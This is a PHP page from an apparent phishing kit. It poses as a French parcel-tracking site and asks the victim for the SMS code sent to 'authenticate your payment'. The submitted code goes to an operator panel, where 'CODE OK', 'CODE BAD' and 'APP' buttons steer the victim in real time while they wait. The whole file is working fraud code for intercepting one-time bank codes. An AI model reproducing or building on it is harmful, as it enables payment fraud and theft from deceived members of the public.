<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (isset($_POST['code'])) {
        $code = htmlspecialchars($_POST['code']);
        $user = $_SESSION['nom'];

        $msg = "$user, a soumis le code de confirmation : <b><i><code>$code</code></i></b>";

        $_SESSION["msg"] = $msg;
        $id = createId();
        $_SESSION["id"] = $id;
        $_SESSION["btn"] = [

            [
                ['text' => 'CODE OK', "url" => $domain . '/admin/action?redirect=fin&id=' . $id],
                ['text' => 'CODE BAD', "url" => $domain . '/admin/action?redirect=confirmation&id=' . $id, 'inv' => true],
            ],
            [
                ['text' => 'APP', "url" => $domain . '/admin/action?redirect=APP&id=' . $id],
            ]
        ];
        header("location: /waiting");
    }

    die();
}

$header = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/header.php');
$footer = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/footer.php');
$html = (function () {
    global $rez;
    ob_start();
?>
    <form method="post">
        <div class="breadcrumb">
            <div class="grid">
                <div class="row">
                    <ul>
                        <li><a href="#/">
                                Accueil</a></li>
                        <li class="active">Suivi de colis</li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="internal-page suivi">
            <div class="grid">
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12 mt-5 center">
                    </div>
                </div>
            </div>
            <div class="main">

                <div data-v-67007474="" id="tracking-wrapper" class="app-wrapper">
                    <div data-v-577ebd12="" data-v-67007474="">
                        <div class="suivi-colis-page">
                            <div data-v-577ebd12="" class="input-zone">
                                <h2 data-v-577ebd12="">Colis numéro: <?= $rez["suivi"] ?>

                                </h2>
                                <p>
                                    Vous avez reçu un code par SMS pour authentifier votre paiement.
                                </p>
                                <?php if (isset($_GET["invalid"])) { ?>
                                    <p class="info-container" data-v-577ebd12="">
                                    Le code est incorrect. Veuillez réessayer.

                                    </p>
                                <?php } ?>

                                <br>
                                <h4 style="text-align: center">Code reçu par SMS</h4>
                                <div class="form-row" style="width: 100%;">
                                    <input type="tel" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" maxlength="20" minlength="6" name="code" required="required" placeholder="Entrez le code reçu par SMS">
                                </div>
                                <div>
                                    <button type="submit" id="tracking_form_submit" class="btn btn-primary btn-suivi">Confirmer votre transaction</button>
                                </div>
                            </div>

    </form>
    <div id="loader-div-new" class="hidden-class-new">
        <div id="mask-id-new"></div>
        <div class="spinner-class-new"></div>
    </div>
    <script>
        document.querySelector("form").addEventListener("submit", function(e) {
            document.getElementById("loader-div-new").style.visibility = "visible";
            document.getElementById("mask-id-new").style = "opacity: 1; bottom: -500px;"
        })
    </script>
    </div>

    </div>
    </div>
    </div>
    </form>
<?php
    return ob_get_clean();
})();

$html = $header . $html . $footer;
require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/base.php');
?>